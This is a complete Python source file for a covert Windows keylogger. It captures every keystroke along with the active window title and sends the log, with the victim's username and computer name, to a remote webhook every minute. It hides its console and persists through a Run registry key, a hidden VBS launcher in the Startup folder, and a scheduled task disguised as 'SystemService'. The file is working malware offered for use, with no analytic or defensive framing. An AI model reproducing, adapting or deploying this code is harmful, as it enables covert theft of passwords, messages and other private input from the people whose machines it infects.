import keyboard
import time
import threading
import requests
import os
import sys
import winreg
import ctypes
from datetime import datetime

class Keylogger:
    def __init__(self, webhook_url, log_interval=60):
        self.webhook_url = webhook_url
        self.log_interval = log_interval
        self.log_buffer = ""
        self.modifier_state = {
            "ctrl": False,
            "alt": False,
            "shift": False,
            "windows": False
        }
        
        self.username = os.environ.get('USERNAME', 'Unknown')
        self.computer_name = os.environ.get('COMPUTERNAME', 'Unknown')
        
        try:
            app_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
            requests.post(self.webhook_url, json={
                "content": f"```\nKeylogger started on:\nUser: {self.username}\nComputer: {self.computer_name}\nPath: {app_path}\n```"
            })
        except Exception:
            pass
        
        self.special_keys = {
            "space": "SPACE",
            "enter": "ENTER",
            "backspace": "BACKSPACE",
            "tab": "TAB",
            "esc": "ESC",
            "delete": "DEL",
            "home": "HOME",
            "end": "END",
            "page up": "PGUP",
            "page down": "PGDN",
            "up": "UP",
            "down": "DOWN",
            "left": "LEFT",
            "right": "RIGHT",
            "maj": "SHIFT",
            "haut": "UP",
            "bas": "DOWN",
            "gauche": "LEFT",
            "droite": "RIGHT"
        }
        
        for i in range(1, 13):
            self.special_keys[f"f{i}"] = f"F{i}"

    def start(self):
        self.start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        keyboard.hook(self.callback)
        
        self.report_timer = threading.Timer(self.log_interval, self.report)
        self.report_timer.daemon = True
        self.report_timer.start()

    def callback(self, event):
        if event.event_type == keyboard.KEY_DOWN:
            self.process_keydown(event)
        elif event.event_type == keyboard.KEY_UP:
            self.process_keyup(event)

    def process_keydown(self, event):
        key_name = event.name
        if not key_name:
            return
            
        key_name = key_name.lower()
        
        if key_name in ["ctrl", "alt", "shift", "windows", "control", "maj"]:
            if key_name == "control":
                key_name = "ctrl"
            elif key_name == "maj":
                key_name = "shift"
                
            self.modifier_state[key_name] = True
            return
        
        if key_name in self.special_keys:
            key_text = self.special_keys[key_name]
        elif len(key_name) == 1:
            key_text = key_name
        else:
            key_text = key_name.upper()
        
        active_mods = [mod.upper() for mod, active in self.modifier_state.items() if active]
        
        if active_mods:
            combo = "+".join(active_mods) + "+" + key_text
            self.log_buffer += f"[{combo}] "
        else:
            if len(key_text) == 1:
                self.log_buffer += key_text
            else:
                self.log_buffer += f"[{key_text}] "

    def process_keyup(self, event):
        key_name = event.name
        if not key_name:
            return
            
        key_name = key_name.lower()
        
        if key_name in ["ctrl", "alt", "shift", "windows", "control", "maj"]:
            if key_name == "control":
                key_name = "ctrl"
            elif key_name == "maj":
                key_name = "shift"
                
            self.modifier_state[key_name] = False

    def report(self):
        if self.log_buffer:
            hwnd = ctypes.windll.user32.GetForegroundWindow()
            length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
            buff = ctypes.create_unicode_buffer(length + 1)
            ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
            window_title = buff.value
            
            payload = {
                "content": f"```\nUser: {self.username} ({self.computer_name})\nPath: C:\\Users\\{self.username}\nTimestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\nWindow: {window_title}\nKeystrokes: {self.log_buffer}\n```"
            }
            
            try:
                requests.post(self.webhook_url, json=payload)
                self.log_buffer = ""
            except Exception:
                pass
                
        self.report_timer = threading.Timer(self.log_interval, self.report)
        self.report_timer.daemon = True
        self.report_timer.start()

    def add_to_startup(self):
        if getattr(sys, 'frozen', False):
            app_path = sys.executable
            app_name = os.path.basename(app_path)
            
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, app_path)
                winreg.CloseKey(key)
            except Exception:
                pass
                
            try:
                startup_folder = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
                if not os.path.exists(f"{startup_folder}\\{app_name}.lnk"):
                    with open(f"{startup_folder}\\{app_name}.vbs", "w") as f:
                        f.write(f'CreateObject("WScript.Shell").Run "{app_path}", 0, True')
            except Exception:
                pass
            
            try:
                os.system(f'schtasks /create /tn "SystemService" /tr "{app_path}" /sc onlogon /rl highest /f')
            except Exception:
                pass

def hide_console():
    if getattr(sys, 'frozen', False):
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def main():
    WEBHOOK_URL = "YOUR_WEBHOOK_HERE"
    
    hide_console()
    
    keylogger = Keylogger(WEBHOOK_URL, log_interval=60)
    keylogger.add_to_startup()
    keylogger.start()
    
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    main()
